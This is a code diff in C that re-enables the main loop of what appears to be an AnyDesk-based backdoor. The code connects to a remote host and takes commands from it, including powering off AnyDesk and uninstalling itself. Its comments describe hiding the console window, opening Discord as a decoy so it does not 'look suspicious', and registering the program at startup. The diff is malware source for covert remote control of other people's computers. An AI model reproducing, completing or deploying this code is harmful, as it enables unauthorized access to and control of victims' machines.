@@ -157,7 +157,9 @@ int processCommand(int command)
         powerOffAnyDesk();
         break;
     case 4:
-        
+        uninstallProgram();
+        _close(serverSocket);
+        exit(0);
 
     default:
         break;
@@ -174,38 +176,33 @@ void checkIfProgramAlreadyRunning()
         exit(1);
 }
 
-//int main(int argc, char const *argv[])
-//{
-//    bool isThereError = false;
-//
-//    //hideConsoleWindow(); // Hides the console window
-//
-//    //ShellExecute(0, 0, L"https://discord.com/", 0, 0, SW_SHOW); // Opens discord to don't looks suspicios
-//    checkIfProgramAlreadyRunning();
-//    
-//    //RegisterProgram(); // Registers the app to the startup
-//    setAnyDeskFilePath();
-//    
-//    if (isTheAnyDeskFile(anyDeskFilePath)) {
-//        _defineAnyDeskSettings(); // TODO: make it updated
-//    }
-//
-//    connectToHost();
-//
-//    do
-//    {
-//        if (getCommands() == SOCKET_ERROR)
-//        {
-//            isThereError = true;
-//            printf("Restart socket connection...\n");
-//            connectToHost();
-//        }
-//    } while (isThereError);
-//
-//    return 0;
-//}
+int main(int argc, char const *argv[])
+{
+    bool isThereError = false;
 
-int main() {
-    RegisterProgram();
-    RemoveMyProgramFromStartup();
+    //hideConsoleWindow(); // Hides the console window
+
+    //ShellExecute(0, 0, L"https://discord.com/", 0, 0, SW_SHOW); // Opens discord to don't looks suspicios
+    checkIfProgramAlreadyRunning();
+    
+    //RegisterProgram(); // Registers the app to the startup
+    setAnyDeskFilePath();
+    
+    if (isTheAnyDeskFile(anyDeskFilePath)) {
+        _defineAnyDeskSettings(); 
+    }
+
+    connectToHost();
+
+    do
+    {
+        if (getCommands() == SOCKET_ERROR)
+        {
+            isThereError = true;
+            printf("Restart socket connection...\n");
+            connectToHost();
+        }
+    } while (isThereError);
+
+    return 0;
 }
